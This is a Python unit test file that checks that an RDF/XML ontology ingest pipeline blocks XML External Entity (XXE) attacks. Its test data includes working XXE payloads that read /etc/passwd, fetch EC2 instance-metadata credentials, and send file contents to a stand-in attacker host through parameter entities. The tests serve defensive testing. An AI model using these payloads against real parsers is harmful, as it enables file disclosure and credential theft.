# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: Apache-2.0

"""Unit tests for XXE (XML External Entity) protection in RDF/XML ingest.

Verifies that parsing RDF/XML ontologies blocks EXTERNAL entity resolution and
external DTDs (file disclosure / SSRF, CWE-611) while still permitting the
benign INTERNAL string entities that standard OWL ontologies (BFO, IOF, OBO)
declare for namespace prefixes.
"""

import pytest

pytestmark = pytest.mark.unit


class TestXXEProtection:
    """Verify that XML External Entity attacks are blocked during RDF/XML parsing."""

    def _ingest_rdfxml(self, rdfxml_content: str):
        """Helper to ingest RDF/XML content through the full ingest pipeline."""
        from unittest.mock import MagicMock, patch

        from coa_ontology.catalog.ingest import IngestMetadata, ingest_ontology

        graph_store, vector_store = MagicMock(), MagicMock()
        vector_store.store_embeddings_batch.return_value = 0

        # Patch external dependencies so we can test the parse path in isolation
        with (
            patch("coa_ontology.catalog.ingest.dynamo_store") as ds,
            patch(
                "coa_ontology.catalog.ingest._accumulate_embeddings",
                return_value={"status": "ok", "count": 0, "model_id": "test", "index": "test", "entity_uris": []},
            ),
        ):
            ds.get_ontology_registry.return_value = None
            ds.put_namespace_meta.return_value = None
            return ingest_ontology(
                graph_store,
                vector_store,
                rdfxml_content,
                namespace="ns-test",
                metadata=IngestMetadata(
                    ontology_id="http://example.org/test#",
                    format="rdf-xml",
                    source="xxe-test",
                ),
                validate=False,
                allow_append=True,
            )

    def test_benign_rdfxml_still_parses(self):
        """Verify that legitimate RDF/XML continues to parse correctly."""
        benign = """<?xml version="1.0" encoding="UTF-8"?>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
         xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
         xmlns:owl="http://www.w3.org/2002/07/owl#">
  <owl:Ontology rdf:about="http://example.org/test#"/>
  <owl:Class rdf:about="http://example.org/test#TestClass">
    <rdfs:label>Test Class</rdfs:label>
  </owl:Class>
</rdf:RDF>"""
        result = self._ingest_rdfxml(benign)
        assert result["ontology_id"] == "http://example.org/test#"
        assert result["class_count"] >= 1

    def test_internal_entities_allowed(self):
        """Internal string entities (namespace-prefix macros in BFO/IOF/OBO) must parse.

        They carry no SYSTEM/PUBLIC identifier, so they are not an XXE vector.
        """
        internal_entities = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rdf:RDF [
  <!ENTITY ex "http://example.org/test#">
]>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
         xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
         xmlns:owl="http://www.w3.org/2002/07/owl#">
  <owl:Ontology rdf:about="&ex;"/>
  <owl:Class rdf:about="&ex;TestClass">
    <rdfs:label>Test Class</rdfs:label>
  </owl:Class>
</rdf:RDF>"""
        result = self._ingest_rdfxml(internal_entities)
        assert result["ontology_id"] == "http://example.org/test#"
        assert result["class_count"] >= 1

    def test_xxe_file_disclosure_blocked(self):
        """An XXE payload reading /etc/passwd is blocked before entity resolution."""
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rdf:RDF [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
         xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
         xmlns:owl="http://www.w3.org/2002/07/owl#">
  <owl:Ontology rdf:about="http://example.org/test#"/>
  <owl:Class rdf:about="http://example.org/test#Exfil">
    <rdfs:label>&xxe;</rdfs:label>
  </owl:Class>
</rdf:RDF>"""
        from coa_ontology.catalog.ingest import IngestParseError

        # defusedxml raises EntitiesForbidden, which rdflib wraps,
        # which ingest.py catches and re-raises as IngestParseError.
        with pytest.raises(IngestParseError) as exc_info:
            self._ingest_rdfxml(xxe_payload)
        # The error message should indicate entity resolution was forbidden
        assert "Forbidden" in str(exc_info.value) or "entity" in str(exc_info.value).lower()

    def test_xxe_ssrf_blocked(self):
        """An XXE payload fetching the EC2 instance metadata endpoint (SSRF) is blocked."""
        ssrf_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rdf:RDF [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
         xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
         xmlns:owl="http://www.w3.org/2002/07/owl#">
  <owl:Ontology rdf:about="http://example.org/test#"/>
  <owl:Class rdf:about="http://example.org/test#Exfil">
    <rdfs:label>&ssrf;</rdfs:label>
  </owl:Class>
</rdf:RDF>"""
        from coa_ontology.catalog.ingest import IngestParseError

        with pytest.raises(IngestParseError) as exc_info:
            self._ingest_rdfxml(ssrf_payload)
        assert "Forbidden" in str(exc_info.value) or "entity" in str(exc_info.value).lower()

    def test_parameter_entity_expansion_blocked(self):
        """Verify that parameter entity expansion (another XXE variant) is blocked."""
        param_entity_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rdf:RDF [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example.com/?data=%file;'>">
  %eval;
  %exfil;
]>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
         xmlns:owl="http://www.w3.org/2002/07/owl#">
  <owl:Ontology rdf:about="http://example.org/test#"/>
</rdf:RDF>"""
        from coa_ontology.catalog.ingest import IngestParseError

        with pytest.raises(IngestParseError):
            self._ingest_rdfxml(param_entity_payload)
